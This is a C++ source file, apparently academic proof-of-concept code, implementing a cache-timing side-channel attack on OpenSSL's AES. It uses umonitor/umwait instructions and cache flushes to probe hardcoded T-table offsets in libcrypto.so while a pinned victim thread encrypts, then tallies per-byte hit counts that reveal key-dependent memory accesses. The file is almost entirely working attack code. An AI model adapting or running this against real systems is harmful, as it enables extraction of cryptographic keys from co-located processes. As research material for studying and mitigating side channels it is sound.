#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../cacheutils.h"
#include <pthread.h>
#include <map>
#include <vector>


// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (100)

#define CORE_VICTIM 1
#define CORE_ATTACKER 0

#define OFFSET 64 * 21
#define INSTR_MONITOR asm volatile("umonitor %%rax" : : "a"(test+OFFSET), "c"(0), "d"(0));
#define INSTR_WAIT asm volatile("xor %%rbx, %%rbx; umwait %%rcx; jnc 1f; inc %%rbx; 1: nop" : "=b"(carry) : "a"(-1), "d"(-1), "c"(0));

#define STEP 2

#define T_INIT 35885

#define ABS(x) ((x) > 0 ? (x) : (-(x)))

__attribute__((aligned(4096))) char test[4096];

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};


void pin_to_core(int core) {
    cpu_set_t cpuset;
    pthread_t thread;

    thread = pthread_self();

    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);

    pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
}

typedef size_t (*sfnc_t)(void);

size_t volatile t_sync = 0;
size_t volatile t = 0;
int volatile is_probe_in_Te;

std::map<char*, std::map<size_t, size_t> > timings;

char* base;
char* probe;
char* end;

unsigned char plaintext[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
unsigned char ciphertext[128];

#define START_MEASURE     maccess(test+OFFSET); t_sync = 1; asm volatile("mfence"); 
#define STOP_MEASURE      asm volatile("lfence");

void aes_measure(sfnc_t func, unsigned char* plaintext, unsigned char* ciphertext, AES_KEY* key_struct) {
    for (size_t j = 1; j < 16; ++j)
        plaintext[j] = rand() % 256;

    flush(probe);

    size_t local_t = t;
    AES_encrypt(plaintext, ciphertext, key_struct);

    START_MEASURE

    for(size_t w = 0; w < local_t; w++) asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop");

    // the observed event
    size_t x = *(volatile size_t*)probe;
    asm volatile("lfence");
    test[OFFSET] = x; 

    STOP_MEASURE
}

void* aes_thread(void* dummy) {
    pin_to_core(CORE_ATTACKER);
    sleep(1);
    printf("Measuring...\n");

    AES_KEY key_struct;

    AES_set_encrypt_key(key, 128, &key_struct);

    uint64_t min_time = rdtsc();
    srand(min_time);

    while(1) {
        aes_measure(NULL, plaintext, ciphertext, &key_struct);
	    while(t_sync);
    }
}

int main()
{
    int fd = open("/home/rzhang/openssl/libcrypto.so", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    if (size == 0)
        exit(-1);
    size_t map_size = size;
    if ((map_size & 0xFFF) != 0)
    {
        map_size |= 0xFFF;
        map_size += 1;
    }
    base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
    end = base + size;

    memset(test, 1, sizeof(test));

    pin_to_core(CORE_VICTIM);

    pthread_t p;
    pthread_create(&p, NULL, aes_thread, NULL);
    sched_yield();
    
    t = T_INIT;
    size_t timeout = 0, writes = 0;
    
    //FILE* f = fopen("log.csv", "w");

    size_t te0 = 0x15df80;
    size_t te1 = 0x15db80;
    size_t te2 = 0x15d780;
    size_t te3 = 0x15d380;

    for (size_t byte = 0; byte < 256; byte += 16) 
    {
	    plaintext[0] = byte;

        for (probe = base + te0; probe < base + te0 + 64*16; probe += 64)
        //for (probe = base; probe < end; probe += 64)
        {
            for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
            {
                while(!(t_sync));
                INSTR_MONITOR
                size_t carry = 0;
                INSTR_WAIT

                if(!carry) {
                    writes++;
                }
                t_sync = 0;
            }
            sched_yield();
            timings[probe][byte] = writes;
            sched_yield();

            //fprintf(f, "%p, %f\n", (void*)(probe - base), timeout * 100.0 / (timeout + writes));
            //fflush(f);
                
            timeout = 0;
            writes = 0;
        }
    }

    for (auto ait : timings)
    {
        printf("%p", (void*) (ait.first - base));
        for (auto kit : ait.second)
        {
            printf(",%6lu", kit.second);
        }
        printf("\n");
    }

    close(fd);
    munmap(base, map_size);
    fflush(stdout);
    return 0;
}
